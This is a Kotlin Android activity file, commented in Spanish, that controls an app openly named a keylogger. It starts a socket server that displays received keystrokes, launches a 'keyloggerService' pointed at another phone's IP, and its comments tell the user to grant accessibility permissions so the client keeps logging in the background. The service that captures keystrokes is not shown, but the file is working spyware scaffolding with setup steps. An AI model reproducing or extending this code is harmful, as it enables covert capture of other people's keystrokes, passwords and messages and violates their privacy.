package com.example.socket

import MyServerSocket
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast

//Guia de uso
//Activar en accesibility los permisos de accesibilidad de la aplicacion
// El telefono servidor no puede cerrarse se coloca su ip respectivo en el input IP
// El telefono cliente se conecta al ip del telefono servidor colocandolo en el input IP
// El telefono cliente puede trabajar en segundo plano y trabajar
// Para ver los mensajes metete en el logcat y busca el filtro package:mine

class MainActivity : AppCompatActivity() {

    private lateinit var textView: TextView
    private val handler = Handler(Looper.getMainLooper()) { message ->
        // Agregar la nueva línea al TextView
        val data = message.obj as String
        appendToTextView(data)
        true
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Inicializar textView
        textView = findViewById(R.id.textAreaKeylloger)

        val inputMessage: EditText = findViewById(R.id.inputPort)
        val inputIp: EditText = findViewById(R.id.inputIp)
        val buttonConnect: Button = findViewById(R.id.buttonConnect)

        buttonConnect.setOnClickListener {
            Thread {
                MyServerSocket(handler).startServer()
            }.start()
            val ip = inputIp.text.toString()
            if (ip.isEmpty()) {
                Toast.makeText(this, "Por favor, ingresa una ip", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            startKeyloggerService(ip)
        }
    }

    private fun startKeyloggerService(ip: String) {
        val intent = Intent(this, keyloggerService::class.java)
        intent.putExtra("SERVER_IP", ip)
        startService(intent)
        Toast.makeText(this, "Servicio de keylogger iniciado", Toast.LENGTH_SHORT).show()
    }

    // Función para agregar texto al TextView y hacer scroll automático
    private fun appendToTextView(text: String) {
        runOnUiThread {
            textView.append("$text\n") // Agrega la nueva línea al final
            // Desplaza el ScrollView hacia abajo para mostrar el último contenido
            val scrollView = textView.parent as ScrollView
            scrollView.post {
                scrollView.fullScroll(ScrollView.FOCUS_DOWN)
            }
        }
    }
}

